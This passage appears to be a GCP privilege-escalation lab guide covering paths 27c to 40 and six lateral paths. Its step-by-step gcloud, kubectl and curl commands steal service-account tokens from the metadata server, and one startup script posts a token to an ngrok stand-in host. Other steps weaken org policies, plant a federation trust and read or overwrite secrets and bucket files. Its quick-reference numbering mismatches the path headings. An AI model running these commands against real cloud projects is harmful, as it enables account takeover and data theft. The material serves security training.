# Step 1: Impersonate the update-only SA (has update but NOT create)
gcloud config set auth/impersonate_service_account \
  privesc27c-dm-update@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Get the target deployment created by terraform
export TARGET_DEPLOYMENT=$(terraform output -raw privesc27c_target_deployment_name)
# Or list all deployments:
gcloud deployment-manager deployments list

# Step 3: View the current deployment config
gcloud deployment-manager deployments describe privesc27c-target

# Step 4: Create an updated config that adds a new VM with high-priv SA
export EXFIL_URL="https://xxxx.ngrok.io"
cat > /tmp/privesc27c-deployment.yaml << EOF
resources:
- name: privesc27c-vm
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/e2-micro
    disks:
    - deviceName: boot
      type: PERSISTENT
      boot: true
      autoDelete: true
      initializeParams:
        sourceImage: projects/debian-cloud/global/images/family/debian-11
    networkInterfaces:
    - network: global/networks/default
      accessConfigs:
      - name: External NAT
        type: ONE_TO_ONE_NAT
    serviceAccounts:
    - email: privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
      scopes:
      - https://www.googleapis.com/auth/cloud-platform
    metadata:
      items:
      - key: startup-script
        value: |
          #!/bin/bash
          TOKEN=\$(curl -s -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
          curl -X POST -H "Content-Type: application/json" -d "\$TOKEN" $EXFIL_URL/token
EOF

# Step 5: Update the existing deployment to add the new resource
gcloud deployment-manager deployments update $TARGET_DEPLOYMENT \
  --config=/tmp/privesc27c-deployment.yaml

# Cleanup
gcloud config unset auth/impersonate_service_account
```

> **Note:** This option is under testing. If `deploymentmanager.deployments.update` works without
> `create`, this will become a separate privilege escalation path (Path 28) with its own SA.

---

## Composer (Path 28)

### Path 28: Composer (Cloud Composer/Airflow)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc27-composer@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `composer.environments.create` |
| **Target** | Airflow environment with high-priv SA |
| **Impact** | Execute DAGs as high-priv SA |
| **Cost** | ~$300/month |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc27-composer@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a Composer environment (expensive - ~$300/mo)
# This is typically IAM-only in the lab
gcloud composer environments create privesc27-composer \
  --location=us-central1 \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# The Airflow workers will run with the high-priv SA
```

---

## Dataflow (Path 29)

### Path 29: Dataflow

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc29-dataflow@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `dataflow.jobs.create` |
| **Supporting Permissions** | `dataflow.jobs.get` |
| **Target** | Dataflow job with high-priv SA |
| **Impact** | Execute data pipeline as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc29-dataflow@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a Dataflow job with the high-priv SA
gcloud dataflow jobs run privesc29-job \
  --gcs-location=gs://dataflow-templates/latest/Word_Count \
  --service-account-email=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --parameters=inputFile=gs://dataflow-samples/shakespeare/kinglear.txt,output=gs://BUCKET/output

# The job workers run with high-priv SA credentials
```

---

## Dataproc (Paths 30-31)

### Path 30: Dataproc Clusters

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc30-dataproc@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `dataproc.clusters.create` |
| **Target** | Dataproc cluster with high-priv SA |
| **Impact** | SSH to cluster nodes, steal SA token |
| **Cost** | ~$0.10/hour |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc30-dataproc@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a Dataproc cluster (costs ~$0.10/hr)
gcloud dataproc clusters create privesc30-cluster \
  --region=us-central1 \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --single-node

# Step 3: SSH to the master node
gcloud compute ssh privesc30-cluster-m --zone=us-central1-a

# Step 4: Get the SA token from metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Cleanup
gcloud dataproc clusters delete privesc30-cluster --region=us-central1 --quiet
```

---

### Path 31: dataproc.jobs.create

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc31-dataproc-jobs@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `dataproc.jobs.create` |
| **Target** | Existing Dataproc cluster with high-priv SA |
| **Impact** | Execute jobs on cluster, access SA credentials |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc31-dataproc-jobs@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Submit a job to an existing cluster
gcloud dataproc jobs submit spark \
  --cluster=EXISTING_CLUSTER \
  --region=us-central1 \
  --class=org.apache.spark.examples.SparkPi \
  --jars=file:///usr/lib/spark/examples/jars/spark-examples.jar \
  -- 1000

# The job runs with the cluster's service account credentials
# You can submit a custom job that exfiltrates the token
```

---

## GKE/Kubernetes (Paths 32-33)

### Path 32: GKE Cluster Create

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc32-gke@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `container.clusters.create` |
| **Target** | GKE cluster with high-priv node SA |
| **Impact** | Access SA via Kubernetes pods |
| **Cost** | ~$70/month minimum |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc32-gke@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a GKE cluster (costs ~$70/mo minimum)
gcloud container clusters create privesc32-cluster \
  --zone=us-central1-a \
  --num-nodes=1 \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Get credentials
gcloud container clusters get-credentials privesc32-cluster --zone=us-central1-a

# Step 4: Deploy a pod to access node SA
kubectl run privesc32-pod --image=google/cloud-sdk:slim --command -- sleep infinity
kubectl exec -it privesc32-pod -- gcloud auth print-access-token

# Cleanup
gcloud container clusters delete privesc32-cluster --zone=us-central1-a --quiet
```

---

### Path 33: container.clusters.getCredentials

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc33-gke-creds@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `container.clusters.getCredentials` |
| **Target** | Existing GKE cluster |
| **Impact** | Access cluster, potentially access node SA via pods |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc33-gke-creds@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Get credentials for an existing cluster
gcloud container clusters get-credentials EXISTING_CLUSTER --zone=us-central1-a

# Step 3: Access the cluster
kubectl get pods --all-namespaces

# Step 4: If you can create pods, access the node's SA
kubectl run privesc33-pod --image=google/cloud-sdk:slim --command -- sleep infinity
kubectl exec -it privesc33-pod -- curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

## Vertex AI (Paths 34-35)

### Path 34: Vertex AI Notebooks

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc34-notebooks@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `notebooks.instances.create` |
| **Target** | Notebook instance with high-priv SA |
| **Impact** | Interactive shell as high-priv SA |
| **Cost** | ~$25/month |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc34-notebooks@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a notebook instance (costs ~$25/mo)
gcloud notebooks instances create privesc34-notebook \
  --location=us-central1-a \
  --vm-image-project=deeplearning-platform-release \
  --vm-image-family=tf-latest-cpu \
  --machine-type=n1-standard-1 \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Access via JupyterLab and run code to get tokens

# Cleanup
gcloud notebooks instances delete privesc34-notebook --location=us-central1-a --quiet
```

---

### Path 35: aiplatform.customJobs.create

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc35-aiplatform@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `aiplatform.customJobs.create` |
| **Target** | AI Platform custom job with high-priv SA |
| **Impact** | Execute training jobs as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc35-aiplatform@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a custom job definition
cat > /tmp/job-spec.yaml << EOF
displayName: privesc35-job
jobSpec:
  serviceAccount: privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
  workerPoolSpecs:
  - machineSpec:
      machineType: n1-standard-4
    replicaCount: 1
    containerSpec:
      imageUri: gcr.io/cloud-aiplatform/training/tf-cpu.2-6:latest
      command:
      - bash
      - -c
      - |
        curl -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
EOF

# Step 3: Create the custom job
gcloud ai custom-jobs create \
  --region=us-central1 \
  --config=/tmp/job-spec.yaml
```

---

## Cloud Workflows (Path 36)

### Path 36: Cloud Workflows

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc36-workflows@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `workflows.workflows.create` |
| **Target** | Workflow with high-priv SA |
| **Impact** | Execute API calls as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc36-workflows@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a workflow definition
cat > /tmp/workflow.yaml << 'EOF'
main:
  steps:
    - get_project:
        call: http.get
        args:
          url: https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID
          auth:
            type: OAuth2
        result: project_info
    - return_result:
        return: ${project_info.body}
EOF

# Step 3: Deploy the workflow
gcloud workflows deploy privesc36-workflow \
  --source=/tmp/workflow.yaml \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --location=us-central1

# Step 4: Execute the workflow
gcloud workflows run privesc36-workflow --location=us-central1

# Cleanup
gcloud workflows delete privesc36-workflow --location=us-central1 --quiet
```

---

## Eventarc (Path 37)

### Path 37: eventarc.triggers.create

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc37-eventarc@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `eventarc.triggers.create` |
| **Target** | Eventarc trigger with high-priv SA |
| **Impact** | Execute code on GCP events as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc37-eventarc@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create an Eventarc trigger
gcloud eventarc triggers create privesc37-trigger \
  --location=us-central1 \
  --destination-run-service=YOUR_CLOUD_RUN_SERVICE \
  --destination-run-region=us-central1 \
  --event-filters="type=google.cloud.audit.log.v1.written" \
  --event-filters="serviceName=storage.googleapis.com" \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# The trigger will invoke your service with the high-priv SA's credentials
# whenever the specified events occur
```

---

## Workload Identity (Path 38)

### Path 38: Workload Identity Federation Abuse

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc38-workload-identity@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.workloadIdentityPoolProviders.create` |
| **Target** | Workload Identity Pool |
| **Impact** | Federate external identity to impersonate SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc38-workload-identity@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a workload identity pool
gcloud iam workload-identity-pools create privesc38-pool \
  --location="global" \
  --description="Malicious pool"

# Step 3: Create a provider that trusts your external identity
gcloud iam workload-identity-pools providers create-oidc privesc38-provider \
  --location="global" \
  --workload-identity-pool="privesc38-pool" \
  --issuer-uri="https://your-oidc-provider.com" \
  --attribute-mapping="google.subject=assertion.sub"

# Step 4: Grant the pool permission to impersonate the high-priv SA
gcloud iam service-accounts add-iam-policy-binding \
  privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/privesc38-pool/*"

# Step 5: Use your external identity to get GCP tokens
```

---

## Org Policy (Path 39)

### Path 39: orgpolicy.policy.set

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc39-org-policy@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `orgpolicy.policy.set` |
| **Target** | Organization/Project policies |
| **Impact** | Disable security controls, enable resource creation |
| **Requires** | `enable_privesc39 = true` |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc39-org-policy@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: List current org policies
gcloud org-policies list --project=$PROJECT_ID

# Step 3: Disable a restrictive policy (e.g., domain restriction)
cat > /tmp/policy.yaml << EOF
name: projects/$PROJECT_ID/policies/iam.allowedPolicyMemberDomains
spec:
  reset: true
EOF

gcloud org-policies set-policy /tmp/policy.yaml

# Step 4: Or enable a dangerous constraint
cat > /tmp/policy.yaml << EOF
name: projects/$PROJECT_ID/policies/compute.vmExternalIpAccess
spec:
  rules:
  - allowAll: true
EOF

gcloud org-policies set-policy /tmp/policy.yaml
```

---

## Deny Bypass (Path 40)

### Path 40: Explicit Deny Bypass via SA Chaining

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc40-deny-bypass@PROJECT_ID.iam.gserviceaccount.com` |
| **Intermediate SA** | `privesc40-medium-priv-sa@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | Token Creator on intermediate SA |
| **Target** | Bypass IAM deny policies |
| **Impact** | Access resources denied to your user |

```bash
# Step 1: Your user might be denied direct access to certain resources
# But you can impersonate an SA that isn't subject to the deny policy

# Step 2: Impersonate the starting SA
gcloud config set auth/impersonate_service_account \
  privesc40-deny-bypass@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: The starting SA can impersonate the medium-priv SA
# The medium-priv SA has Editor role and is NOT subject to deny policies
gcloud auth print-access-token \
  --impersonate-service-account=privesc40-medium-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 4: Use the token to access resources
# The deny policy on the original identity doesn't apply through the SA chain
ACCESS_TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=privesc40-medium-priv-sa@$PROJECT_ID.iam.gserviceaccount.com)

# Step 5: Verify access with the medium-priv SA token
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://iam.googleapis.com/v1/projects/$PROJECT_ID/serviceAccounts" | jq '.accounts[].email'

# Step 6: Cleanup
gcloud config unset auth/impersonate_service_account
```

---

## Quick Reference: All Service Accounts

| Path | Service Account Email |
|------|----------------------|
| Target (high-priv) | `privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com` |
| Instance Connect (completion) | `privesc-instance-connect@PROJECT_ID.iam.gserviceaccount.com` |
| **IAM Service Account** | |
| 1 | `privesc1-set-iam-policy@PROJECT_ID.iam.gserviceaccount.com` |
| 2 | `privesc2-create-sa-key@PROJECT_ID.iam.gserviceaccount.com` |
| 3 | `privesc3-set-sa-iam@PROJECT_ID.iam.gserviceaccount.com` |
| 4 | `privesc4-get-access-token@PROJECT_ID.iam.gserviceaccount.com` |
| 5 | `privesc5-sign-blob@PROJECT_ID.iam.gserviceaccount.com` |
| 6 | `privesc6-sign-jwt@PROJECT_ID.iam.gserviceaccount.com` |
| 7 | `privesc7-implicit-deleg@PROJECT_ID.iam.gserviceaccount.com` |
| 7 (intermediate) | `privesc7-medium-priv-sa@PROJECT_ID.iam.gserviceaccount.com` |
| 8 | `privesc8-get-oidc-token@PROJECT_ID.iam.gserviceaccount.com` |
| 9 | `privesc9-update-role@PROJECT_ID.iam.gserviceaccount.com` |
| **Compute Engine** | |
| 10 | `privesc10-actas-compute@PROJECT_ID.iam.gserviceaccount.com` |
| 11a | `privesc11a-set-metadata@PROJECT_ID.iam.gserviceaccount.com` |
| 11b | `privesc11b-set-metadata@PROJECT_ID.iam.gserviceaccount.com` |
| 12 | `privesc12-set-proj-meta@PROJECT_ID.iam.gserviceaccount.com` |
| 13 | `privesc13-existing-ssh@PROJECT_ID.iam.gserviceaccount.com` |
| 14 | `privesc14-os-login@PROJECT_ID.iam.gserviceaccount.com` |
| 15 | `privesc15-set-sa@PROJECT_ID.iam.gserviceaccount.com` |
| 16a | `privesc16a-inst-templ@PROJECT_ID.iam.gserviceaccount.com` |
| 16b | `privesc16b-inst-templ@PROJECT_ID.iam.gserviceaccount.com` |
| 16c | `privesc16c-inst-templ@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Functions** | |
| 17 | `privesc17-actas-function@PROJECT_ID.iam.gserviceaccount.com` |
| 18 | `privesc18-update-function@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Run** | |
| 19 | `privesc19-actas-cloudrun@PROJECT_ID.iam.gserviceaccount.com` |
| 20 | `privesc20-run-update@PROJECT_ID.iam.gserviceaccount.com` |
| 21 | `privesc21-run-jobs@PROJECT_ID.iam.gserviceaccount.com` |
| 22 | `privesc22-run-jobs-update@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Build** | |
| 23a | `privesc23a-actas-cloudbuild@PROJECT_ID.iam.gserviceaccount.com` |
| 23b | `privesc23b-triggers@PROJECT_ID.iam.gserviceaccount.com` |
| 24 | `privesc24-builds-update@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Scheduler** | |
| 25 | `privesc25-scheduler@PROJECT_ID.iam.gserviceaccount.com` |
| **Deployment Manager** | |
| 26 | `privesc26-deployment-manager@PROJECT_ID.iam.gserviceaccount.com` |
| **Composer** | |
| 27 | `privesc27-composer@PROJECT_ID.iam.gserviceaccount.com` |
| **Dataflow** | |
| 28 | `privesc29-dataflow@PROJECT_ID.iam.gserviceaccount.com` |
| **Dataproc** | |
| 29 | `privesc30-dataproc@PROJECT_ID.iam.gserviceaccount.com` |
| 30 | `privesc31-dataproc-jobs@PROJECT_ID.iam.gserviceaccount.com` |
| **GKE/Kubernetes** | |
| 31 | `privesc32-gke@PROJECT_ID.iam.gserviceaccount.com` |
| 32 | `privesc33-gke-creds@PROJECT_ID.iam.gserviceaccount.com` |
| **Vertex AI** | |
| 33 | `privesc34-notebooks@PROJECT_ID.iam.gserviceaccount.com` |
| 34 | `privesc35-aiplatform@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Workflows** | |
| 35 | `privesc36-workflows@PROJECT_ID.iam.gserviceaccount.com` |
| **Eventarc** | |
| 36 | `privesc37-eventarc@PROJECT_ID.iam.gserviceaccount.com` |
| **Workload Identity** | |
| 37 | `privesc38-workload-identity@PROJECT_ID.iam.gserviceaccount.com` |
| **Org Policy** | |
| 38 | `privesc39-org-policy@PROJECT_ID.iam.gserviceaccount.com` |
| **Deny Bypass** | |
| 39 | `privesc40-deny-bypass@PROJECT_ID.iam.gserviceaccount.com` |
| 39 (intermediate) | `privesc40-medium-priv-sa@PROJECT_ID.iam.gserviceaccount.com` |

### Lateral Movement Service Accounts

| Path | Service Account |
|------|-----------------|
| **Storage** | |
| L1 | `lateral1-bucket-iam@PROJECT_ID.iam.gserviceaccount.com` |
| L2 | `lateral2-storage-write@PROJECT_ID.iam.gserviceaccount.com` |
| **Secret Manager** | |
| L3 | `lateral3-secret-access@PROJECT_ID.iam.gserviceaccount.com` |
| L4 | `lateral4-secret-setiam@PROJECT_ID.iam.gserviceaccount.com` |
| **Pub/Sub** | |
| L5 | `lateral5-pubsub-iam@PROJECT_ID.iam.gserviceaccount.com` |
| **BigQuery** | |
| L6 | `lateral6-bq-setiam@PROJECT_ID.iam.gserviceaccount.com` |

---

## Lateral Movement Paths (Honorable Mentions)

These paths demonstrate **data access and lateral movement**, NOT privilege escalation. They allow accessing sensitive data but don't grant higher IAM privileges.

---

### Lateral Path 1: setIamPolicy on Storage Bucket

| Property | Value |
|----------|-------|
| **Category** | Data Access |
| **Starting SA** | `lateral1-bucket-iam@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `storage.buckets.setIamPolicy` |
| **Target** | Storage bucket with sensitive data |
| **Impact** | Grant yourself access to bucket contents |

```bash
# Step 1: Impersonate the SA
gcloud config set auth/impersonate_service_account \
  lateral1-bucket-iam@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Grant yourself access to the bucket
gsutil iam ch user:your-email@example.com:objectViewer gs://BUCKET_NAME

# Step 3: Clear impersonation and access the bucket
gcloud config unset auth/impersonate_service_account
gsutil ls gs://BUCKET_NAME
```

---

### Lateral Path 2: storage.objects.create

| Property | Value |
|----------|-------|
| **Category** | Persistence / Injection |
| **Starting SA** | `lateral2-storage-write@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `storage.objects.create` |
| **Target** | Sensitive bucket (terraform state, configs, etc.) |
| **Impact** | Overwrite configuration files, inject malicious content |

```bash
# Step 1: Impersonate the SA
gcloud config set auth/impersonate_service_account \
  lateral2-storage-write@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Overwrite a sensitive file
echo '{"malicious": "content"}' | gsutil cp - gs://BUCKET_NAME/sensitive-file.json

# Cleanup
gcloud config unset auth/impersonate_service_account
```

---

### Lateral Path 3: Secret Manager Access

| Property | Value |
|----------|-------|
| **Category** | Data Exfiltration |
| **Starting SA** | `lateral3-secret-access@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `secretmanager.versions.access` |
| **Target** | Secrets containing credentials |
| **Impact** | Read sensitive secrets (API keys, passwords, etc.) |

```bash
# Step 1: Impersonate the SA
gcloud config set auth/impersonate_service_account \
  lateral3-secret-access@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: List and access secrets
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET_NAME

# Cleanup
gcloud config unset auth/impersonate_service_account
```

---

### Lateral Path 4: secretManager.setIamPolicy

| Property | Value |
|----------|-------|
| **Category** | Data Access |
| **Starting SA** | `lateral4-secret-setiam@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `secretmanager.secrets.setIamPolicy` |
| **Target** | Secret IAM policy |
| **Impact** | Grant yourself access to any secret |

```bash
# Step 1: Impersonate the SA
gcloud config set auth/impersonate_service_account \
  lateral4-secret-setiam@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Grant yourself access to a secret
gcloud secrets add-iam-policy-binding SECRET_NAME \
  --member="user:your-email@example.com" \
  --role="roles/secretmanager.secretAccessor"

# Step 3: Clear impersonation and access the secret
gcloud config unset auth/impersonate_service_account
gcloud secrets versions access latest --secret=SECRET_NAME
```

---

### Lateral Path 5: setIamPolicy on Pub/Sub

| Property | Value |
|----------|-------|
| **Category** | Data Access |
| **Starting SA** | `lateral5-pubsub-iam@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `pubsub.topics.setIamPolicy` |
| **Target** | Pub/Sub topics/subscriptions |
| **Impact** | Grant access to message data |

```bash
# Step 1: Impersonate the SA
gcloud config set auth/impersonate_service_account \
  lateral5-pubsub-iam@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Grant yourself access to a topic
gcloud pubsub topics add-iam-policy-binding TOPIC_NAME \
  --member="user:your-email@example.com" \
  --role="roles/pubsub.subscriber"

# Step 3: Clear impersonation and read messages
gcloud config unset auth/impersonate_service_account
gcloud pubsub subscriptions pull SUBSCRIPTION_NAME
```

---

### Lateral Path 6: bigquery.datasets.setIamPolicy

| Property | Value |
|----------|-------|
| **Category** | Data Access |
| **Starting SA** | `lateral6-bq-setiam@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `bigquery.datasets.setIamPolicy` |
| **Target** | BigQuery datasets |
| **Impact** | Grant yourself access to any dataset |

```bash
# Step 1: Impersonate the SA
gcloud config set auth/impersonate_service_account \
  lateral6-bq-setiam@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Grant yourself access to a dataset
bq add-iam-policy-binding \
  --member="user:your-email@example.com" \
  --role="roles/bigquery.dataViewer" \
  $PROJECT_ID:DATASET_NAME

# Step 3: Clear impersonation and query the data
gcloud config unset auth/impersonate_service_account
bq query --use_legacy_sql=false 'SELECT * FROM `PROJECT_ID.DATASET_NAME.TABLE_NAME` LIMIT 10'
```

---

## References

- [Privilege Escalation in GCP](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
- [GCP IAM Roles](https://cloud.google.com/iam/docs/understanding-roles)
- [Service Account Impersonation](https://cloud.google.com/iam/docs/impersonating-service-accounts)
- [FoxMapper Documentation](https://github.com/BishopFox/foxmapper)
